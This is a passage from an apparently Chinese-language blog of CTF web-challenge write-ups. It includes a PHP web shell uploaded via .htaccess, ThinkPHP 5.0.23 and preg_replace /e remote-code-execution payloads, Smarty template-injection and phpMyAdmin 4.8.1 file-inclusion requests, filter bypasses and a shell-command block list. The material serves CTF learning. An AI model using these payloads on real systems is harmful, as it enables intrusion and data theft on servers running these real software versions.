</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?exp=var_dump(readfile(array_rand(array_flip(scandir(current(localeconv()))))));
</span></span></code></pre></td></tr></table></div></div><p>一层一层解释：</p><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组</p><p><strong>图片展示</strong></p><p>current() 返回数组中的当前单元, 默认取第一个值。别名pos()</p><p>到这里获得的是一个点</p><p>scandir() 遍历目录，是<code>.</code>的话就是列出当前目录。</p><p>此时输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>array(5) { [0]=&gt; string(1) &#34;.&#34; [1]=&gt; string(2) &#34;..&#34; [2]=&gt; string(4) &#34;.git&#34; [3]=&gt; string(8) &#34;flag.php&#34; [4]=&gt; string(9) &#34;index.php&#34; }
</span></span></code></pre></td></tr></table></div></div><p>这时的输出还是键值对的形式，我们需要使用<code>array_flip()</code>函数交换键值对，然后使用随机函数<code>array_rand()</code>从数组中随机取出一个或多个单元。因为正则的原因无法使用<code>file_get_contents()</code>，但是还有其他读取文件的函数:readfile()、highlight_file()和它的别名函数show_source()。</p><hr><h1 id=gxyctf2019babyupload class=headerLink><a href=#gxyctf2019babyupload class=header-mark></a>[GXYCTF2019]BabyUpload</h1><p>ph过滤，image/gif不能通过。image/jpe可以</p><p>上传.htaccess</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SetHandler application/x-httpd-php
</span></span></code></pre></td></tr></table></div></div><p>上传码，但是不能是php代码，使用js</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;script language=&#34;php&#34;&gt;eval($_REQUEST[shell])&lt;/script&gt;
</span></span></code></pre></td></tr></table></div></div><p>完工</p><hr><h1 id=bjdctf-2ndold-hack class=headerLink><a href=#bjdctf-2ndold-hack class=header-mark></a>[BJDCTF 2nd]old-hack</h1><p>ThinkPHP的<a href=https://blog.csdn.net/qq_38807738/article/details/86777541 target=_blank rel="noopener noreffer">漏洞</a></p><p>ThinkPHP5 5.0.23</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /flag
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=安洵杯-2019easy_web class=headerLink><a href=#%e5%ae%89%e6%b4%b5%e6%9d%af-2019easy_web class=header-mark></a>[安洵杯 2019]easy_web</h1><p>看url一个img和cmd，页面中有一个图片的标签，和一个<strong>md5 is funny ~</strong>。把url中img的值进行解码发现图片名为<code>555.png</code>，尝试用同样的编码方式读取index.php，加密的编码依次为：hex&ndash;>base64&ndash;>base64。</p><p>index.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>error_reporting(E_ALL || ~ E_NOTICE);
</span></span><span class=line><span class=cl>header(&#39;content-type:text/html;charset=utf-8&#39;);
</span></span><span class=line><span class=cl>$cmd = $_GET[&#39;cmd&#39;];
</span></span><span class=line><span class=cl>if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) 
</span></span><span class=line><span class=cl>    header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);
</span></span><span class=line><span class=cl>$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$file = preg_replace(&#34;/[^a-zA-Z0-9.]+/&#34;, &#34;&#34;, $file);
</span></span><span class=line><span class=cl>if (preg_match(&#34;/flag/i&#34;, $file)) {
</span></span><span class=line><span class=cl>    echo &#39;&lt;img src =&#34;./ctf3.jpeg&#34;&gt;&#39;;
</span></span><span class=line><span class=cl>    die(&#34;xixi～ no flag&#34;);
</span></span><span class=line><span class=cl>} else {
</span></span><span class=line><span class=cl>    $txt = base64_encode(file_get_contents($file));
</span></span><span class=line><span class=cl>    echo &#34;&lt;img src=&#39;data:image/gif;base64,&#34; . $txt . &#34;&#39;&gt;&lt;/img&gt;&#34;;
</span></span><span class=line><span class=cl>    echo &#34;&lt;br&gt;&#34;;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>echo $cmd;
</span></span><span class=line><span class=cl>echo &#34;&lt;br&gt;&#34;;
</span></span><span class=line><span class=cl>if (preg_match(&#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&#34;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&#34;, $cmd)) {
</span></span><span class=line><span class=cl>    echo(&#34;forbid ~&#34;);
</span></span><span class=line><span class=cl>    echo &#34;&lt;br&gt;&#34;;
</span></span><span class=line><span class=cl>} else {
</span></span><span class=line><span class=cl>    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) {
</span></span><span class=line><span class=cl>        echo `$cmd`;
</span></span><span class=line><span class=cl>    } else {
</span></span><span class=line><span class=cl>        echo (&#34;md5 is funny ~&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?&gt;
</span></span><span class=line><span class=cl>&lt;html&gt;
</span></span><span class=line><span class=cl>&lt;style&gt;
</span></span><span class=line><span class=cl>  body{
</span></span><span class=line><span class=cl>   background:url(./bj.png)  no-repeat center center;
</span></span><span class=line><span class=cl>   background-size:cover;
</span></span><span class=line><span class=cl>   background-attachment:fixed;
</span></span><span class=line><span class=cl>   background-color:#CCCCCC;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>&lt;/style&gt;
</span></span><span class=line><span class=cl>&lt;body&gt;
</span></span><span class=line><span class=cl>&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></td></tr></table></div></div><p>我不知道为什么，我的bp一定要在<code>&</code>前加一个空格才可以通过。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?cmd=uniq%20/flag
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST
</span></span><span class=line><span class=cl>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
</span></span><span class=line><span class=cl>&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
</span></span></code></pre></td></tr></table></div></div><p>读文件的绕过有</p><blockquote><table><thead><tr><th style=text-align:center>1</th><th>more:一页一页的显示档案内容</th></tr></thead><tbody><tr><td style=text-align:center>2</td><td>less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</td></tr><tr><td style=text-align:center>3</td><td>head:查看头几行</td></tr><tr><td style=text-align:center>4</td><td>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</td></tr><tr><td style=text-align:center>5</td><td>tail:查看尾几行</td></tr><tr><td style=text-align:center>6</td><td>nl：显示的时候，顺便输出行号</td></tr><tr><td style=text-align:center>7</td><td>od:以二进制的方式读取档案内容</td></tr><tr><td style=text-align:center>8</td><td>vi:一种编辑器，这个也可以查看</td></tr><tr><td style=text-align:center>9</td><td>vim:一种编辑器，这个也可以查看</td></tr><tr><td style=text-align:center>10</td><td>sort:可以查看</td></tr><tr><td style=text-align:center>11</td><td>uniq:可以查看</td></tr><tr><td style=text-align:center>12</td><td>file -f:报错出具体内容</td></tr></tbody></table></blockquote><p>摘自<a href=https://www.ghtwf01.cn/index.php/archives/273/ target=_blank rel="noopener noreffer">命令执行漏洞利用及绕过方式总结</a>。</p><hr><h1 id=bjdctf2020mark-loves-cat class=headerLink><a href=#bjdctf2020mark-loves-cat class=header-mark></a>[BJDCTF2020]Mark loves cat</h1><p>git泄露</p><p>flag.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$flag = file_get_contents(&#39;/flag&#39;);
</span></span></code></pre></td></tr></table></div></div><p>index.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>include &#39;flag.php&#39;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$yds = &#34;dog&#34;;
</span></span><span class=line><span class=cl>$is = &#34;cat&#34;;
</span></span><span class=line><span class=cl>$handsome = &#39;yds&#39;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>foreach($_POST as $x =&gt; $y){
</span></span><span class=line><span class=cl>    $$x = $y;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>foreach($_GET as $x =&gt; $y){
</span></span><span class=line><span class=cl>    $$x = $$y;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>foreach($_GET as $x =&gt; $y){
</span></span><span class=line><span class=cl>    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;){
</span></span><span class=line><span class=cl>        exit($handsome);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){
</span></span><span class=line><span class=cl>    exit($yds); 
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;){
</span></span><span class=line><span class=cl>    exit($is);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>echo &#34;the flag is: &#34;.$flag;
</span></span></code></pre></td></tr></table></div></div><p>尝试输出<code>$flag</code>即可。exit()函数退出时也会输出。</p><p>第一个不可能实现，如果POST或GET传入flag的话必然导致<code>$flag</code>修改，那么正好符合第二个if。</p><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET
</span></span><span class=line><span class=cl>?yds=flag
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST(任意，但是需要保证不传flag)
</span></span><span class=line><span class=cl>is=233flag
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=bjdctf2020the-mystery-of-ip class=headerLink><a href=#bjdctf2020the-mystery-of-ip class=header-mark></a>[BJDCTF2020]The mystery of ip</h1><p>hint.php里面有注释</p><blockquote><p>Do you know why i know your ip?</p></blockquote><p>去flag.php尝试加入请求头x-forward-x、client-ip发现ip可以改变。然后是自己感觉网页很简单，突破点在请求头中，尝试了下ssti模板注入，发现成功了。</p><p>尝试了几个ssti的payload不行，但是提示了</p><blockquote><p>Uncaught &ndash;> Smarty Compiler:&mldr;&mldr;&mldr;&mldr;&mldr;&mldr;&mldr;</p></blockquote><p>得知了这个是Smarty引擎，在网上尝试搜索这种类型的注入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>请求：
</span></span><span class=line><span class=cl>X-Forwarded-For: {system(&#39;cat /flag&#39;)}
</span></span></code></pre></td></tr></table></div></div><p><a href=https://github.com/epinna/tplmap target=_blank rel="noopener noreffer">SSTI神器–Tplmap</a>，看介绍是和sqlmap差不多的工具。</p><p>这个师傅的博客写的很全：https://www.cnblogs.com/R3col/p/12746485.html，所有类型的模板引擎payload都有，注入之前需要先确定类型。</p><p><a href=https://www.cnblogs.com/20175211lyz/p/11425368.html target=_blank rel="noopener noreffer">CTF SSTI(服务器模板注入)</a></p><p><a href=https://xz.aliyun.com/t/3679/ target=_blank rel="noopener noreffer">flask之ssti模版注入从零到入门</a></p><hr><h1 id=gwctf-2019我有一个数据库 class=headerLink><a href=#gwctf-2019%e6%88%91%e6%9c%89%e4%b8%80%e4%b8%aa%e6%95%b0%e6%8d%ae%e5%ba%93 class=header-mark></a>[GWCTF 2019]我有一个数据库</h1><p>页面是乱码，想知道内容了可以看下图</p><p>$$各种乱码图</p><p>对照的是古文码。是以GBK方式读取UTF-8编码的中文，我举个例子，使用vscode，先通过编码保存&ndash;>GBK，再通过编码打开&ndash;>UTF-8。内容如下</p><blockquote><p>我有一个数据库，但里面什么也没有~
不信你找</p></blockquote><p>提示是数据库了，那么果断尝试PHPmyadmin，访问成功，然后查看下版本，去网上搜索对应版本的漏洞</p><p><a href=https://www.secpulse.com/archives/72817.html target=_blank rel="noopener noreffer">phpmyadmin4.8.1后台getshell</a></p><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/phpmyadmin/index.php?target=db_sql.php%253f../../../../../../flag
</span></span></code></pre></td></tr></table></div></div><p>可以包含任意文件，理应可以包含数据库文件，在数据库表字段写shell，没成不知道数据库文件名称</p><hr><h1 id=20210301 class=headerLink><a href=#20210301 class=header-mark></a>2021.03.01</h1><hr><h1 id=bjdctf2020zjctf不过如此 class=headerLink><a href=#bjdctf2020zjctf%e4%b8%8d%e8%bf%87%e5%a6%82%e6%ad%a4 class=header-mark></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>绕过</p><p>第一层用php伪协议中的data封装流。<a href=https://segmentfault.com/a/1190000018991087 target=_blank rel="noopener noreffer">PHP伪协议总结</a></p><p>然后进入文件包含，提示包含next.php文件，还是使用php伪协议中的php://filter</p><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php
</span></span></code></pre></td></tr></table></div></div><p>读出来的next.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K
</span></span></code></pre></td></tr></table></div></div><p>base64解码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>$id = $_GET[&#39;id&#39;];
</span></span><span class=line><span class=cl>$_SESSION[&#39;id&#39;] = $id;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function complex($re, $str) {
</span></span><span class=line><span class=cl>    return preg_replace(
</span></span><span class=line><span class=cl>        &#39;/(&#39; . $re . &#39;)/ei&#39;,
</span></span><span class=line><span class=cl>        &#39;strtolower(&#34;\\1&#34;)&#39;,
</span></span><span class=line><span class=cl>        $str
</span></span><span class=line><span class=cl>    );
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>foreach($_GET as $re =&gt; $str) {
</span></span><span class=line><span class=cl>    echo complex($re, $str). &#34;\n&#34;;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function getFlag(){
</span></span><span class=line><span class=cl>	@eval($_GET[&#39;cmd&#39;]);
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>这里想要通过需要知道一个<a href=http://www.xinyueseo.com/websecurity/158.html target=_blank rel="noopener noreffer">深入研究 preg_replace /e 模式下的代码漏洞问题</a></p><p>最终payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>next.php?\S*=${getFlag()}&amp;cmd=system(&#39;cat /flag&#39;);
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=de1ctf-2019ssrf-me class=headerLink><a href=#de1ctf-2019ssrf-me class=header-mark></a>[De1CTF 2019]SSRF Me</h1><p>进入页面是一堆源码，之前写过flask的可以大概理出来几个重要的点，但是还是贴一下源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#! /usr/bin/env python</span>
</span></span><span class=line><span class=cl><span class=c1># encoding=utf-8</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>request</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>reload</span><span class=p>(</span><span class=n>sys</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=o>.</span><span class=n>setdefaultencoding</span><span class=p>(</span><span class=s1>&#39;latin1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>secert_key</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Task</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>action</span><span class=p>,</span> <span class=n>param</span><span class=p>,</span> <span class=n>sign</span><span class=p>,</span> <span class=n>ip</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>action</span> <span class=o>=</span> <span class=n>action</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>param</span> <span class=o>=</span> <span class=n>param</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>sign</span> <span class=o>=</span> <span class=n>sign</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>sandbox</span> <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=n>ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>sandbox</span><span class=p>)):</span>  <span class=c1># SandBox For Remote_Addr</span>
</span></span><span class=line><span class=cl>            <span class=n>os</span><span class=o>.</span><span class=n>mkdir</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>sandbox</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>Exec</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>500</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>checkSign</span><span class=p>()):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;scan&#34;</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>action</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>tmpfile</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;./</span><span class=si>%s</span><span class=s2>/result.txt&#34;</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>sandbox</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>resp</span> <span class=o>=</span> <span class=n>scan</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>param</span><span class=p>)</span>  <span class=c1># 此处是文件读取得注入点</span>
